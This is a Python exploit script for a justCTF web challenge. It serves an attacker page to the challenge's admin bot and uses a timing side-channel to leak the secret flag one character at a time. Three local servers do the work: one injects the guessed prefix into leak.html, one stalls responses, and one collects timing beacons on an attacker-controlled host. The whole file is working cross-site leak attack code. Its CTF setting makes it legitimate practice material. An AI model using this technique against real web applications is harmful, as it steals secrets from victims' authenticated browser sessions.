#!/usr/bin/env nix-shell
#!nix-shell -p "python3.withPackages(ps: [ ps.requests ])" -i python3

import socket
import threading
from collections import defaultdict

import requests
import time

REMOTE = False
TASK_ADDR = '127.0.0.1'
MY_SERVER_ADDR = '192.168.69.1'

def serve_sleep_server():
    def thread_function():
        SERVER_HOST = '0.0.0.0'
        SERVER_PORT = 1339

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((SERVER_HOST, SERVER_PORT))
            s.listen()
            while True:
                conn, addr = s.accept()
                with conn:
                    print('sleepfunc:', addr)
                    data = conn.recv(1024)
                    print('sleepfunc:', addr, data)
                    file_bytes = b'//lol'

                    conn.sendall('HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n'.format(len(file_bytes)).encode())
                    time.sleep(30)
                    conn.sendall(file_bytes)
                    conn.close()

    x = threading.Thread(target=thread_function, args=())
    x.start()

def serve_leak_html():
    file_bytes_base = open('leak.html', 'rb').read()

    def thread_function():
        SERVER_HOST = '0.0.0.0'
        SERVER_PORT = 1338

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((SERVER_HOST, SERVER_PORT))
            s.listen()
            while True:
                conn, addr = s.accept()
                with conn:
                    print('accept:', addr)
                    data = conn.recv(1024)
                    print('recv:', addr, data)
                    prefix = data.split(b'flag=')[1].split(b' ')[0]
                    print('serve prefix:', prefix)
                    file_bytes = file_bytes_base.replace(b'let prefix = \'justCTF{\';', b'let prefix = \'justCTF{' + prefix + b'\';')
                    if REMOTE:
                        file_bytes = file_bytes.replace(b'192.168.69.1', MY_SERVER_ADDR.encode())

                    conn.sendall('HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n'.format(len(file_bytes)).encode() + file_bytes)
                    conn.close()

    x = threading.Thread(target=thread_function, args=())
    x.start()


def leak_byte(prefix):
    start_at = time.time()
    global_buf = []
    def thread_function():
        SERVER_HOST = '0.0.0.0'
        SERVER_PORT = 1337

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((SERVER_HOST, SERVER_PORT))
            s.listen()
            while True:
                conn, addr = s.accept()
                with conn:
                    print('accept:', addr)
                    data = conn.recv(1024)
                    print('recv:', addr, data)
                    global_buf.append(data)
                    conn.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n')
                    conn.close()

                    if b'diff!end' in data:
                        s.close()
                        return
            # s.close()

    x = threading.Thread(target=thread_function, args=())
    x.start()

    if REMOTE:
        t = requests.get('http://'+TASK_ADDR+'/bot/', params={
            'url': 'http://'+MY_SERVER_ADDR+':1338/leak.html?flag=' + prefix,
        })
    else:
        t = requests.get('http://127.0.0.1:80/bot/', params={
            'url': 'http://192.168.69.1:1338/leak.html?flag='+prefix,
        })

    print(t.status_code)
    print(t.content)

    x.join()  # wait for close
    print('duration:', time.time()-start_at)

    # show times

    l = []
    d = defaultdict(lambda: [])
    for line in b''.join(global_buf).decode().split('\n'):
        line = line.strip()
        if 'diff!end' in line or 'diff!start' in line:
            continue
        if '/log' in line:
            line = line.split('?d=')[1].split(' HTT')[0]
            _, char, _, t = line.split('!')
            t = float(t)
            print(char, t)
            l.append((t, char))
            d[char].append(t)

    l.sort()
    print(l)

    l = []
    for k, vs in d.items():
        l.append((min(vs), k))

    l.sort()
    print(l)
    if len([a for a in l if a[0] >= 5]) != 1:
        print('retrying!!!')
        return ''

    return l[-1][1]

serve_leak_html()
serve_sleep_server()

import sys
print('flag:', sys.argv[1])
flag = sys.argv[1]
while True:
    bot_sleep = time.time()
    flag += leak_byte(flag)
    print('flag:', flag)

    # if REMOTE:
    #     of = 51 - (time.time() - bot_sleep)
    #     print('sleep bo bot :(,', of)
    #     time.sleep(of)

